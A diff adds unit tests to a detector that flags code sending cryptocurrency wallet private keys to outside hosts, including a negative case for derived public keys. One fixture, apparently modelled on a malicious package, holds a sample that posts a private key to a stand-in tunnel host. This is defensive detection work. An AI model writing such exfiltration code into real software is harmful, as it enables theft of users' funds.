@@ -262,6 +262,28 @@ class TestAWalletKeySent:
         )
         assert self.secret(source) == []
 
+    def test_a_value_named_for_a_private_key_posted(self):
+        # trongridor 0.0.1's shape
+        source = (
+            "import requests\n"
+            "def perm(private_key):\n"
+            "    payload = {'key': private_key}\n"
+            "    requests.post('https://abc.tunnel.example.invalid', json=payload)\n"
+        )
+        assert self.secret(source) == [
+            "secret sent: WALLET_PRIVATE_KEY to abc.tunnel.example.invalid"
+        ]
+
+    def test_a_public_key_derived_from_a_private_key_is_not(self):
+        source = (
+            "import requests\n"
+            "def register(private_key):\n"
+            "    pub = private_key.public_key()\n"
+            "    requests.post('https://api.example.invalid/keys', data=pub.public_bytes())\n"
+            "    requests.post('https://api.example.invalid/k2', data=private_key.public_key())\n"
+        )
+        assert self.secret(source) == []
+
     def test_a_key_of_something_that_is_not_a_wallet_is_not(self):
         source = (
             "import requests\n"
